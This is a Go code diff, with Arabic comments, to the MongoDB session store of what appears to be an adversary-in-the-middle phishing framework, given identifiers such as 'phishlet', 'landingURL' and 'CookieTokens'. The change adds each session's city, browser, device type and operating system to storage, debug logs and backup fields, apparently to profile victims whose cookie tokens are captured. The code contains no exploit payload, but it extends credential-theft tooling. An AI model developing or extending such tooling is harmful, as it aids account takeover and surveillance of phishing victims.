@@ -137,6 +137,10 @@ func convertToMongoSession(s *Session) *MongoSession {
 	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
 	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
 	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
+	log.Debug("[MongoDB] - Session.City: '%s'", s.City)
+	log.Debug("[MongoDB] - Session.Browser: '%s'", s.Browser)
+	log.Debug("[MongoDB] - Session.DeviceType: '%s'", s.DeviceType)
+	log.Debug("[MongoDB] - Session.OS: '%s'", s.OS)
 
 	mongoSession := &MongoSession{
 		ID:           primitive.NewObjectID(),
@@ -156,12 +160,20 @@ func convertToMongoSession(s *Session) *MongoSession {
 		RemoteAddr:   s.RemoteAddr,
 		CountryCode:  s.CountryCode,
 		Country:      s.Country,
+		City:         s.City,
+		Browser:      s.Browser,
+		DeviceType:   s.DeviceType,
+		OS:           s.OS,
 	}
 	
 	// طباعة البيانات بعد التحويل
 	log.Debug("[MongoDB] بعد التحويل:")
 	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
 	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
+	log.Debug("[MongoDB] - MongoSession.City: '%s'", mongoSession.City)
+	log.Debug("[MongoDB] - MongoSession.Browser: '%s'", mongoSession.Browser)
+	log.Debug("[MongoDB] - MongoSession.DeviceType: '%s'", mongoSession.DeviceType)
+	log.Debug("[MongoDB] - MongoSession.OS: '%s'", mongoSession.OS)
 
 	for domain, cookies := range s.CookieTokens {
 		for k, v := range cookies {
@@ -185,6 +197,10 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	log.Debug("[MongoDB] تحويل MongoSession إلى Session:")
 	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", ms.CountryCode)
 	log.Debug("[MongoDB] - MongoSession.Country: '%s'", ms.Country)
+	log.Debug("[MongoDB] - MongoSession.City: '%s'", ms.City)
+	log.Debug("[MongoDB] - MongoSession.Browser: '%s'", ms.Browser)
+	log.Debug("[MongoDB] - MongoSession.DeviceType: '%s'", ms.DeviceType)
+	log.Debug("[MongoDB] - MongoSession.OS: '%s'", ms.OS)
 
 	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]*CookieToken)
@@ -218,12 +234,20 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		UpdateTime:   ms.UpdateTime,
 		CountryCode:  ms.CountryCode,
 		Country:      ms.Country,
+		City:         ms.City,
+		Browser:      ms.Browser,
+		DeviceType:   ms.DeviceType,
+		OS:           ms.OS,
 	}
 	
 	// طباعة البيانات بعد التحويل
 	log.Debug("[MongoDB] بعد التحويل:")
 	log.Debug("[MongoDB] - Session.CountryCode: '%s'", session.CountryCode)
 	log.Debug("[MongoDB] - Session.Country: '%s'", session.Country)
+	log.Debug("[MongoDB] - Session.City: '%s'", session.City)
+	log.Debug("[MongoDB] - Session.Browser: '%s'", session.Browser)
+	log.Debug("[MongoDB] - Session.DeviceType: '%s'", session.DeviceType)
+	log.Debug("[MongoDB] - Session.OS: '%s'", session.OS)
 	
 	// إضافة البيانات للحقول المخصصة كاحتياط إضافي
 	if session.Custom == nil {
@@ -237,6 +261,23 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	
 	if ms.Country != "" {
 		session.Custom["country_backup"] = ms.Country
+	}
+	
+	// نسخ بيانات المدينة والمتصفح
+	if ms.City != "" {
+		session.Custom["city_backup"] = ms.City
+	}
+	
+	if ms.Browser != "" {
+		session.Custom["browser_backup"] = ms.Browser
+	}
+	
+	if ms.DeviceType != "" {
+		session.Custom["device_type_backup"] = ms.DeviceType
+	}
+	
+	if ms.OS != "" {
+		session.Custom["os_backup"] = ms.OS
 	}
 
 	return session
@@ -327,6 +368,10 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		RemoteAddr:   remoteAddr,
 		CountryCode:  "",
 		Country:      "",
+		City:         "",
+		Browser:      "",
+		DeviceType:   "",
+		OS:           "",
 	}
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
